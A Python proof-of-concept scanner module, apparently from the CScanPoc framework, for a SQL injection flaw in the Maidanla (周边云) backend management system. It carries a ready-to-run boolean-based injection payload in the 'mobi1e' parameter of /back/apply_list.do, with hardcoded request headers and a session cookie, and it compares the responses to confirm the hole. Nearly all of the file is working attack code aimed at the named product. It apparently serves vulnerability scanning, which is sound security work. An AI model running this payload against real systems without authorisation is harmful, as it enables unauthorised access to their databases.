# coding:utf-8
import time
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Maidanla_0101' # 平台漏洞编号
    name = '周边云后台管理SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-06-24'  # 漏洞公布时间
    desc = '''模版漏洞描述
    周边云后台管理SQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=205069
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Maidanla(周边云)'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'd29c7bc2-c454-4658-9900-b08a7462b9f6' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-26' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/back/apply_list.do"
            payload = "provinceId2=-1&applytype=1&ptype=1&company&provinceId=-1&cityId=-&mobi1e=13811084866' AND '1120'='1120&isfollow=-1"
            payload1 = "provinceId2=-1&applytype=1&ptype=1&company&provinceId=-1&cityId=-&mobi1e=13811084866' AND '1120'='1000&isfollow=-1"
            headers = {
                "Proxy-Connection": "keep-alive",
                "Content-Length": "98",
                "Cache-Control": "max-age=0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh-CN,zh;q=0.8",
                "Cookie": "Hm_lvt_3114b00fe04ba06a2fce39d30aedf176=1462333811; JSESSIONID=bd8bf19f-9b47-4b4e-b2b1-c3d6f94b240e; Hm_lvt_fabb4719e0914cb328fee76874faed38=1462333736,1462343908; Hm_lpvt_fabb4719e0914cb328fee76874faed38=1462343908"
            }
            _response = requests.post(url, data=payload, headers=headers)
            _response1 = requests.post(url,data=payload1, headers=headers)
            if _response.text != _response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
